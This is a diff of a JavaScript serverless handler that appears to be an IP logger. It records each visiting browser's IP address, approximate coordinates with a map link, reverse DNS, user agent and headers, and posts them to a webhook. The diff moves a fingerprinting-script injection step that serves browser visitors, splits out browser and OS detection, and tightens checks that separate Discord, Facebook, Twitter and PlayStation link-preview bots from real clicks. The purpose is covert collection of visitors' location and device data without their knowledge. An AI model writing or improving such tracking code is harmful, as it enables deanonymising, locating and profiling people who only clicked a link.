@@ -13,16 +13,16 @@ async function sendToWebhook(message) {
         });
 
         if (!response.ok) {
-            console.error(`Failed to send data to webhook. Status: ${response.status}`);
             const errorText = await response.text();
-            console.error("Response text:", errorText);
+            console.error(`Webhook Error [${response.status}]: ${errorText}`);
         } else {
             console.log("Data sent to webhook successfully.");
         }
     } catch (error) {
-        console.error("Failed to send data to webhook:", error);
+        console.error("Webhook sending failed:", error.stack || error);
     }
 }
+
 
 // Get IP details from the IP-API service
 async function getIpDetails(ip) {
@@ -90,12 +90,22 @@ function injectFingerprintScript(res) {
     res.end(fingerprintScript);
 }
 
-// In the handler function, add this for browser requests:
-if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile' || deviceType === 'Tablet')) {
-    injectFingerprintScript(res);
-    return;
+
+function getBrowserEngine(userAgent) {
+    if (/Chrome|Chromium|Edg/.test(userAgent)) return 'Blink';
+    if (/Safari/.test(userAgent)) return 'WebKit';
+    if (/Gecko/.test(userAgent)) return 'Gecko';
+    if (/Trident/.test(userAgent)) return 'Trident';
+    return 'Unknown';
 }
 
+function getOperatingSystem(userAgent) {
+    if (/Windows/.test(userAgent)) return 'Windows';
+    if (/Mac/.test(userAgent)) return 'macOS';
+    if (/Android/.test(userAgent)) return 'Android';
+    if (/Linux/.test(userAgent)) return 'Linux';
+    return 'Unknown';
+}
 
 
 
@@ -126,6 +136,7 @@ export default async function handler(req, res) {
             res.status(500).send("Failed to retrieve IP information.");
             return;
         }
+        
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
         const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
@@ -133,14 +144,9 @@ export default async function handler(req, res) {
         const referer = req.headers['referer'] || 'No referer';
 
         const deviceType = detectDeviceType(userAgent);
-        const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
-            /Safari/.test(userAgent) ? 'WebKit' :
-                /Gecko/.test(userAgent) ? 'Gecko' :
-                    /Trident/.test(userAgent) ? 'Trident' : 'Unknown';
-        const os = /Windows/.test(userAgent) ? 'Windows' :
-            /Mac/.test(userAgent) ? 'macOS' :
-                /Android/.test(userAgent) ? 'Android' :
-                    /Linux/.test(userAgent) ? 'Linux' : 'Unknown';
+
+        const browserEngine = getBrowserEngine(userAgent);
+        const os = getOperatingSystem(userAgent);
 
         const coords = ipDetails.lat && ipDetails.lon
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
@@ -151,9 +157,11 @@ export default async function handler(req, res) {
         // Perform reverse DNS lookup
         const reverseDNS = await getReverseDNS(ipDetails.query);
 
-
-
-
+        // In the handler function, add this for browser requests:
+        if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile' || deviceType === 'Tablet')) {
+            injectFingerprintScript(res);
+            return;
+        }
 
         function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata) {
             return [
@@ -193,7 +201,7 @@ export default async function handler(req, res) {
 
 
         // Check 1: Google LLC and Discordbot
-        if (ipDetails.isp === "Google LLC" && userAgent.contains("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
+        if (ipDetails.isp === "Google LLC" && userAgent.includes("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
             const message = {
                 embeds: [
                     {
@@ -214,7 +222,7 @@ export default async function handler(req, res) {
         }
 
         // Check 2: Facebook External Hit
-        if (ipDetails.isp === "Facebook, Inc." && userAgent === "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)") {
+        if (ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")) {
             const message = {
                 embeds: [
                     {
@@ -235,7 +243,7 @@ export default async function handler(req, res) {
         }
 
         // Check 3: Playstation External Hit
-        if (ipDetails.isp === "Amazon.com, Inc." && userAgent === "UrlPreviewServiceV2") {
+        if (ipDetails.isp === "Amazon.com, Inc." && userAgent.includes("UrlPreviewServiceV2")) {
             const message = {
                 embeds: [
                     {
@@ -256,7 +264,7 @@ export default async function handler(req, res) {
         }
 
         // Check 4: Twitter External Hit
-        if (ipDetails.isp === "Twitter Inc." && userAgent === "Twitterbot/1.0") {
+        if (ipDetails.isp === "Twitter Inc." && userAgent.includes("Twitterbot/1.0")) {
             const message = {
                 embeds: [
                     {
